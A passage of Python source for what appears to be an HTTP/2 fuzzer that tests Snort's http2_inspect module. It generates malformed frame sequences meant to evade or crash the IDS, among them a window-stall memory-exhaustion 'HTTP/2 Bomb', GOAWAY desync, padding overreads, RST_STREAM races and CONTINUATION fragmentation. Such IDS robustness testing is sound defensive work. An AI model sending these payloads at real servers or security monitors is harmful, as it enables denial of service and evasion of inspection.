        elif variant == "many_tiny_data":
            # 2000 DATA frames of 1 byte each — stress per-frame overhead tracking.
            frames += _minimal_request_headers(1, end_stream=False)
            for i in range(2000):
                fl = _FL_END_STREAM if i == 1999 else 0
                frames += _frame(_FT_DATA, fl, 1, bytes([i & 0xFF]))

        elif variant == "window_stall":
            # HTTP/2 Bomb — Slowloris half (CVE-2016-8740 / CVE-2016-1546).
            # Set INITIAL_WINDOW_SIZE to 0 so the server can never send its
            # response, then drip 1-byte WINDOW_UPDATEs to reset the send
            # timeout and keep every allocation pinned in memory.  We open
            # multiple streams to multiply the memory held.
            # First: tell server our receive window is 0
            frames += _settings_frame((_SET_INITIAL_WINDOW_SIZE, 0))
            # Open several streams — server allocates response state for each
            # but can never flush because window is 0.
            num_streams = random.choice([50, 100, 200])
            for i in range(num_streams):
                sid = 2 * i + 1
                frames += _minimal_request_headers(sid, end_stream=True)
            # Drip 1-byte WINDOW_UPDATEs on stream 0 (connection-level) to
            # keep the connection alive and reset send timeouts.
            for _ in range(random.choice([100, 500, 1000])):
                frames += _window_update(0, 1)

        else:  # padded_data_flood
            # DATA frames with maximum padding (255 bytes pad, 1 byte data).
            frames += _minimal_request_headers(1, end_stream=False)
            for i in range(100):
                pad_len = 255
                payload = bytes([pad_len]) + bytes([0x41]) + (b"\x00" * pad_len)
                fl = _FL_PADDED | (_FL_END_STREAM if i == 99 else 0)
                frames += _frame(_FT_DATA, fl, 1, payload)

        return frames

    # ── goaway_desync ───────────────────────────────────────────────────
    # Target: Connection lifecycle management in http2_inspect
    # Attack: Send GOAWAY then continue sending frames. The IDS may stop
    #   tracking the connection after GOAWAY, allowing subsequent traffic
    #   to bypass inspection. Also: GOAWAY with increasing last-stream-id
    #   (prohibited) and oversized debug data.
    elif strategy == "goaway_desync":
        variant = random.choice([
            "goaway_then_continue", "increasing_last_id", "debug_overflow",
            "multiple_goaway", "goaway_stream_nonzero",
        ])
        frames = _valid_preface()

        if variant == "goaway_then_continue":
            # GOAWAY with last-stream-id=0, then open new streams.
            frames += _goaway(0, 0)
            frames += _minimal_request_headers(1)
            frames += _minimal_request_headers(3)

        elif variant == "increasing_last_id":
            # Multiple GOAWAYs with increasing last-stream-id (prohibited).
            frames += _goaway(1, 0)
            frames += _goaway(5, 0)
            frames += _goaway(100, 0)

        elif variant == "debug_overflow":
            # GOAWAY with 50KB of debug data.
            frames += _goaway(0, 0, debug=os.urandom(50000))

        elif variant == "multiple_goaway":
            # 100 GOAWAY frames back to back.
            for i in range(100):
                frames += _goaway(i * 2 + 1, random.randint(0, 0xD))

        else:  # goaway_stream_nonzero
            # GOAWAY on a non-zero stream (protocol violation — must be stream 0).
            payload = struct.pack("!II", 0, 0)
            frames += _frame(_FT_GOAWAY, 0, 5, payload)  # stream 5!

        return frames

    # ── priority_tree_attack ────────────────────────────────────────────
    # Target: Priority/dependency tree processing in http2_inspect
    # Attack: Create pathological dependency trees — self-dependency loops,
    #   extremely deep chains, exclusive deps that restructure the entire tree.
    #   Though deprecated in RFC 9113, Snort still parses these fields.
    elif strategy == "priority_tree_attack":
        variant = random.choice([
            "self_dependency", "deep_chain", "exclusive_flood",
            "zero_weight", "priority_on_idle",
        ])
        frames = _valid_preface()

        if variant == "self_dependency":
            # Stream 1 depends on itself — infinite loop in naive implementations.
            frames += _priority_frame(1, dep=1, weight=128, exclusive=True)

        elif variant == "deep_chain":
            # 500-deep dependency chain: stream 3→1, 5→3, 7→5, ...
            for i in range(500):
                sid = 2 * i + 1
                dep = max(sid - 2, 0)
                frames += _priority_frame(sid, dep=dep, weight=16)

        elif variant == "exclusive_flood":
            # 200 exclusive dependencies all on stream 0 — each one restructures
            # the entire tree.
            for i in range(200):
                frames += _priority_frame(2 * i + 1, dep=0, weight=255, exclusive=True)

        elif variant == "zero_weight":
            # Weight=0 (minimum valid is 1, 0 is protocol violation).
            frames += _priority_frame(1, dep=0, weight=0)
            frames += _minimal_request_headers(1)

        else:  # priority_on_idle
            # PRIORITY on streams that were never opened, at very high IDs.
            for sid in [101, 201, 301, 0x7FFFFFFE - 1]:
                if sid % 2 == 0:
                    sid += 1
                frames += _priority_frame(sid, dep=0, weight=128)

        return frames

    # ── push_promise_confusion ──────────────────────────────────────────
    # Target: Server push tracking in http2_inspect
    # Attack: Client sends PUSH_PROMISE (only servers should), references
    #   conflicting/reused stream IDs, sends PUSH_PROMISE on closed streams.
    #   The IDS must handle all of these without crashing.
    elif strategy == "push_promise_confusion":
        variant = random.choice([
            "client_push", "odd_promised_id", "push_on_closed",
            "push_disabled", "push_reuse_id",
        ])
        frames = _valid_preface()

        if variant == "client_push":
            # Client sending PUSH_PROMISE — protocol violation.
            promised_block = _hpack_indexed(2) + _hpack_indexed(4)
            promised_block += _hpack_literal_indexed(1, b"pushed.example.com")
            promised_block += _hpack_indexed(7)
            payload = struct.pack("!I", 2) + promised_block  # promised stream 2
            frames += _frame(_FT_PUSH_PROMISE, _FL_END_HEADERS, 1, payload)

        elif variant == "odd_promised_id":
            # PUSH_PROMISE with odd promised stream ID (must be even for server push).
            frames += _minimal_request_headers(1, end_stream=True)
            promised_block = _hpack_indexed(2) + _hpack_indexed(4)
            payload = struct.pack("!I", 3) + promised_block  # stream 3 = odd!
            frames += _frame(_FT_PUSH_PROMISE, _FL_END_HEADERS, 1, payload)

        elif variant == "push_on_closed":
            # PUSH_PROMISE on a stream that's already been closed.
            frames += _minimal_request_headers(1, end_stream=True)
            frames += _rst_stream(1, 0)
            promised_block = _hpack_indexed(2) + _hpack_indexed(4)
            payload = struct.pack("!I", 2) + promised_block
            frames += _frame(_FT_PUSH_PROMISE, _FL_END_HEADERS, 1, payload)

        elif variant == "push_disabled":
            # Disable push via SETTINGS, then send PUSH_PROMISE anyway.
            frames += _settings_frame((_SET_ENABLE_PUSH, 0))
            promised_block = _hpack_indexed(2) + _hpack_indexed(4)
            payload = struct.pack("!I", 2) + promised_block
            frames += _frame(_FT_PUSH_PROMISE, _FL_END_HEADERS, 1, payload)

        else:  # push_reuse_id
            # Multiple PUSH_PROMISEs for the same promised stream ID.
            for _ in range(10):
                promised_block = _hpack_indexed(2) + _hpack_indexed(4)
                payload = struct.pack("!I", 2) + promised_block
                frames += _frame(_FT_PUSH_PROMISE, _FL_END_HEADERS, 1, payload)

        return frames

    # ── data_padding_evasion ────────────────────────────────────────────
    # Target: Padding extraction in DATA/HEADERS frames
    # Attack: The IDS must correctly subtract padding from the frame payload
    #   to extract the actual data. If the padding length byte exceeds the
    #   frame payload, it's a PROTOCOL_ERROR — but the IDS error path may
    #   mishandle it. Also test padding in HEADERS frames.
    elif strategy == "data_padding_evasion":
        variant = random.choice([
            "max_padding", "padding_exceeds_payload", "headers_padded",
            "alternating_pad", "pad_only_no_data",
        ])
        frames = _valid_preface()

        if variant == "max_padding":
            # DATA with 255 bytes padding + marker hidden in actual data.
            frames += _minimal_request_headers(1, end_stream=False)
            pad_len = 255
            payload = bytes([pad_len]) + _MARKER + (b"\x00" * pad_len)
            frames += _frame(_FT_DATA, _FL_PADDED | _FL_END_STREAM, 1, payload)

        elif variant == "padding_exceeds_payload":
            # Padding length byte says 200, but frame payload is only 100 bytes.
            # This is a PROTOCOL_ERROR, but IDS must not OOB-read.
            frames += _minimal_request_headers(1, end_stream=False)
            payload = bytes([200]) + b"X" * 99  # total 100 bytes, but pad says 200
            frames += _frame(_FT_DATA, _FL_PADDED | _FL_END_STREAM, 1, payload)

        elif variant == "headers_padded":
            # HEADERS frame with PADDED flag — contains header block + padding.
            pad_len = 100
            block = _hpack_indexed(2) + _hpack_indexed(7)
            block += _hpack_literal_indexed(1, b"host.example.com")
            block += _hpack_indexed(4)
            payload = bytes([pad_len]) + block + (b"\x00" * pad_len)
            frames += _frame(_FT_HEADERS,
                             _FL_END_HEADERS | _FL_END_STREAM | _FL_PADDED, 1, payload)

        elif variant == "alternating_pad":
            # Alternating padded and unpadded DATA frames.
            frames += _minimal_request_headers(1, end_stream=False)
            for i in range(50):
                if i % 2 == 0:
                    pad_len = random.randint(1, 200)
                    data_byte = bytes([i & 0xFF])
                    payload = bytes([pad_len]) + data_byte + (b"\x00" * pad_len)
                    fl = _FL_PADDED | (_FL_END_STREAM if i == 49 else 0)
                else:
                    payload = bytes([i & 0xFF])
                    fl = _FL_END_STREAM if i == 49 else 0
                frames += _frame(_FT_DATA, fl, 1, payload)

        else:  # pad_only_no_data
            # DATA frame where the entire payload is padding (no actual data).
            frames += _minimal_request_headers(1, end_stream=False)
            pad_len = 200
            payload = bytes([pad_len]) + (b"\x00" * pad_len)
            frames += _frame(_FT_DATA, _FL_PADDED | _FL_END_STREAM, 1, payload)

        return frames

    # ── rst_stream_race ─────────────────────────────────────────────────
    # Target: Stream cleanup and inspection lifecycle in http2_inspect
    # Attack: Send HEADERS + DATA + RST_STREAM in rapid succession. The IDS
    #   may discard inspection results for reset streams, missing malicious
    #   content. Also: RST_STREAM on idle streams, wrong error codes.
    elif strategy == "rst_stream_race":
        variant = random.choice([
            "data_then_rst", "headers_then_rst", "rst_idle",
            "rst_after_end_stream", "rapid_rst_flood",
        ])
        frames = _valid_preface()

        if variant == "data_then_rst":
            # HEADERS + DATA with marker + immediate RST_STREAM.
            frames += _minimal_request_headers(1, end_stream=False)
            frames += _frame(_FT_DATA, 0, 1, _MARKER)
            frames += _rst_stream(1, 0x8)  # CANCEL

        elif variant == "headers_then_rst":
            # HEADERS (no END_STREAM, no END_HEADERS) then RST_STREAM.
            block = _hpack_indexed(2) + _hpack_indexed(4)
            frames += _frame(_FT_HEADERS, 0, 1, block)
            frames += _rst_stream(1, 0x1)  # PROTOCOL_ERROR

        elif variant == "rst_idle":
            # RST_STREAM on stream 5 which was never opened.
            frames += _rst_stream(5, 0x7)  # REFUSED_STREAM

        elif variant == "rst_after_end_stream":
            # Send a complete request (END_STREAM), then RST_STREAM the same stream.
            frames += _minimal_request_headers(1, end_stream=True)
            frames += _rst_stream(1, 0x8)

        else:  # rapid_rst_flood
            # Open 100 streams with DATA, immediately RST each one.
            for i in range(100):
                sid = 2 * i + 1
                frames += _minimal_request_headers(sid, end_stream=False)
                frames += _frame(_FT_DATA, 0, sid, _MARKER)
                frames += _rst_stream(sid, 0x8)

        return frames

    # ── preface_manipulation ────────────────────────────────────────────
    # Target: Protocol detection / initial classification in http2_inspect
    # Attack: Malform the 24-byte connection preface to confuse IDS protocol
    #   detection while still being accepted by lenient endpoints. Or embed
    #   HTTP/1.1-style data before the preface (h2c Upgrade path remnant).
    elif strategy == "preface_manipulation":
        variant = random.choice([
            "truncated", "extra_before", "http1_then_h2",
            "wrong_magic", "split_preface",
        ])

        if variant == "truncated":
            # Truncated preface (first 12 bytes only) followed by valid frames.
            frames = _CLIENT_PREFACE[:12] + _empty_settings()
            frames += _minimal_request_headers(1)

        elif variant == "extra_before":
            # Junk bytes before the preface.
            frames = os.urandom(50) + _CLIENT_PREFACE + _empty_settings()
            frames += _minimal_request_headers(1)

        elif variant == "http1_then_h2":
            # HTTP/1.1 Upgrade-style preamble followed by the h2 preface.
            h1 = (b"GET / HTTP/1.1\r\nHost: target.example.com\r\n"
                   b"Upgrade: h2c\r\nHTTP2-Settings: AAEAABAAAAIAAAABAAN\r\n"
                   b"Connection: Upgrade, HTTP2-Settings\r\n\r\n")
            frames = h1 + _CLIENT_PREFACE + _empty_settings()
            frames += _minimal_request_headers(1)

        elif variant == "wrong_magic":
            # Preface with one byte altered.
            bad_preface = bytearray(_CLIENT_PREFACE)
            bad_preface[random.randint(0, 23)] ^= 0xFF
            frames = bytes(bad_preface) + _empty_settings()
            frames += _minimal_request_headers(1)

        else:  # split_preface
            # Valid preface, but with the magic string and SETTINGS in the same
            # payload (normal) — however we also send a second SETTINGS right
            # after to test preface parsing boundary.
            frames = _CLIENT_PREFACE + _empty_settings() + _empty_settings()
            frames += _minimal_request_headers(1)

        return frames

    # ── header_block_fragmentation ──────────────────────────────────────
    # Target: HPACK header block reassembly limits in http2_inspect
    # Attack: Fragment a valid header block into the minimum possible
    #   CONTINUATION frames (1 byte each) or use strategic split points
    #   that break in the middle of HPACK integer/string encodings,
    #   forcing the IDS to correctly buffer partial HPACK state.
    elif strategy == "header_block_fragmentation":
        variant = random.choice([
            "one_byte_frags", "mid_integer_split", "mid_string_split",
            "huge_header_block", "mixed_sizes",
        ])
        frames = _valid_preface()

        # Build a substantial header block with the marker hidden in a header value
        block = _hpack_indexed(2)                       # :method GET
        block += _hpack_indexed(7)                      # :scheme https
        block += _hpack_literal_indexed(1, b"target.example.com")  # :authority
        block += _hpack_indexed(4)                      # :path /
        block += _hpack_literal_new(b"x-payload", _MARKER, indexing=False)

        if variant == "one_byte_frags":
            # Split entire block into 1-byte CONTINUATION frames.
            frames += _frame(_FT_HEADERS, 0, 1, block[:1])
            for i in range(1, len(block)):
                fl = _FL_END_HEADERS if i == len(block) - 1 else 0
                frames += _frame(_FT_CONTINUATION, fl, 1, block[i:i+1])

        elif variant == "mid_integer_split":
            # Split in the middle of an HPACK multi-byte integer encoding.
            # Add a header with a name index that requires multi-byte encoding.
            extra = _hpack_literal_new(b"x-int", b"Z" * 200, indexing=True)
            full_block = block + extra
            # Split at byte 5 (likely mid-integer for the index encoding)
            frames += _frame(_FT_HEADERS, 0, 1, full_block[:5])
            frames += _frame(_FT_CONTINUATION, _FL_END_HEADERS, 1, full_block[5:])

        elif variant == "mid_string_split":
            # Split in the middle of an HPACK string literal.
            # x-payload header value starts at a known offset; split there.
            frames += _frame(_FT_HEADERS, 0, 1, block[:len(block)//2])
            frames += _frame(_FT_CONTINUATION, _FL_END_HEADERS, 1,
                             block[len(block)//2:])

        elif variant == "huge_header_block":
            # 30KB header block split across 150 CONTINUATION frames of 200 bytes.
            big_block = block
            for i in range(200):
                big_block += _hpack_literal_new(
                    f"x-hdr-{i}".encode(), b"V" * 100, indexing=False)
            frames += _frame(_FT_HEADERS, 0, 1, big_block[:200])
            remaining = big_block[200:]
            chunk_size = 200
            chunks = [remaining[i:i+chunk_size] for i in range(0, len(remaining), chunk_size)]
            for idx, chunk in enumerate(chunks):
                fl = _FL_END_HEADERS if idx == len(chunks) - 1 else 0
                frames += _frame(_FT_CONTINUATION, fl, 1, chunk)

        else:  # mixed_sizes
            # Random-sized fragments between 1 and 300 bytes.
            frames += _frame(_FT_HEADERS, 0, 1, block[:3])
            remaining = block[3:]
            while remaining:
                sz = random.randint(1, min(300, len(remaining)))
                chunk = remaining[:sz]
                remaining = remaining[sz:]
                fl = _FL_END_HEADERS if not remaining else 0
                frames += _frame(_FT_CONTINUATION, fl, 1, chunk)

        return frames

    # ── fallback ────────────────────────────────────────────────────────
    else:
        # Benign, valid HTTP/2 request — serves as a baseline / control.
        frames = _valid_preface()
        frames += _minimal_request_headers(1)
        return frames


# ===== Mutator class (same interface as SmtpMutator / HttpMutator) ===========

class Http2Mutator:
    def __init__(self, external_weights: dict = None, bandit=None):
        self.strategies = HTTP2_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return HTTP2_WEIGHTS

    def mutate(self) -> tuple:
        """Returns (payload_bytes, strategy_name)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload = build_http2_payload(strategy)
        return payload, strategy
